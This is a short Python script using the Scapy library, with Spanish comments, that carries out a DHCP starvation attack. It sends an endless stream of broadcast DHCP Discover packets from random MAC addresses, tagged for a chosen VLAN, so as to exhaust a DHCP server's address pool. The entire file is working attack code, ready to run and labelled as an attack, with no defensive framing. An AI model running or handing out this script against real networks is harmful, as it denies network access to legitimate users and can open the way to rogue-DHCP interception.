#!/usr/bin/env python3
import sys
import time
from scapy.all import *

# Desactivar mensajes de advertencia innecesarios de Scapy
conf.verb = 0

def dhcp_starvation(interface, vlan_id):
    print(f"[*] Iniciando DHCP Starvation en la interfaz {interface} para la VLAN {vlan_id}...")
    print("[*] Presiona Ctrl+C para detener el ataque.")
    contador = 0
    try:
        while True:
            # 1. Generar una MAC aleatoria para simular un cliente nuevo
            mac_falsa = RandMAC()
            # 2. Construir el paquete DHCP Discover con encapsulación de Capa 2 (Trunk)
            # Capa Ethernet -> Capa 802.1Q (VLAN) -> Capa IP -> Capa UDP -> Capa BOOTP -> Capa DHCP
            packet = (
                Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff") /
                Dot1Q(vlan=vlan_id) /
                IP(src="0.0.0.0", dst="255.255.255.255") /
                UDP(sport=68, dport=67) /
                BOOTP(chaddr=RandBin(6)) /
                DHCP(options=[("message-type", "discover"), "end"])
            )
            # 3. Enviar el paquete por la interfaz física principal (ens4)
            sendp(packet, iface=interface, verbose=False)
            contador += 1
            if contador % 50 == 0:
                print(f"[+] Enviados {contador} peticiones DHCP Discover falsas...")
    except KeyboardInterrupt:
        print(f"\n[-] Ataque detenido. Se enviaron un total de {contador} paquetes.")

if __name__ == "__main__":
    # Definimos tu interfaz física conectada al switch core y la VLAN a atacar
    IFACE = "ens4"
    VLAN = 10  # Cambia a 20 si deseas agotar el otro pool
    dhcp_starvation(IFACE, VLAN)
